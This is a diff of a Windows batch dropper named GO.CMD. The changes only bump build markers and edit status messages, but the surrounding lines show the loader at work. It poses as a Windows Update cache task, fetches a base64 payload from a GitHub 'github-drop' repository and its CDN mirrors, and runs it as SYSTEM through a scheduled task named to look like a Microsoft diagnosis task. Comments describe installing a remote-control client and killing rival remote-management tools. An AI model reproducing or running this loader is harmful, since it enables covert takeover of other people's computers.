@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions
-echo === GO.CMD BUILD 20260730WU7U4 ===
+echo === GO.CMD BUILD 20260730WU7U5 ===
 
 net session >nul 2>&1
 if errorlevel 1 (
@@ -13,7 +13,7 @@ set "B64=%WORKDIR%\update.b64"
 set "PS1=%WORKDIR%\wucache_pkg.ps1"
 set "PS1ALT=C:\Windows\Temp\wucache_pkg.ps1"
 set "ERR=%WORKDIR%\boot.err"
-set "MARKER=WU_BUILD_20260730_UNIFIED4"
+set "MARKER=WU_BUILD_20260730_UNIFIED5"
 set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
 set "RUNPS="
 set "CB=%RANDOM%%RANDOM%"
@@ -47,7 +47,7 @@ schtasks /Delete /TN "\Microsoft\Windows\Diagnosis\Scheduled" /F >nul 2>&1
 
 echo NOTE: rival RMM nuke runs ONLY after primary SC is RUNNING (inside payload).
 echo NOTE: allowed alt SC (pluxn) is NEVER killed by image name.
-echo Downloading UNIFIED4 payload (cache-bust %CB%)...
+echo Downloading UNIFIED5 payload (cache-bust %CB%)...
 call :try_curl "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateA.b64?t=%CB%" && goto :have_payload
 call :try_curl "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=%CB%" && goto :have_payload
 call :try_curl "https://fastly.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=%CB%" && goto :have_payload
@@ -114,10 +114,10 @@ if errorlevel 1 (
 )
 schtasks /Run /TN "%ONCETASK%"
 echo Payload OK [%MARKER%], launched as SYSTEM.
-echo Order: protect alt -^> ensure primary SC -^> then nuke rivals (alt never killed).
+echo Order: protect alt -^> skip reinstall if primary healthy -^> nuke rivals (alt never killed).
 sc start "%ALTSC%" >nul 2>&1
 echo Wait 180s then check:
-echo   type "%WORKDIR%\.diag.log"
+echo   type "%WORKDIR%\.diag.log" ^| findstr /I "ENSURE-OK SKIP PHASE PROTECT"
 echo   sc query "%PRIMSC%"
 echo   sc query "%ALTSC%"
 echo   dir "%WORKDIR%\scclient\*.exe"
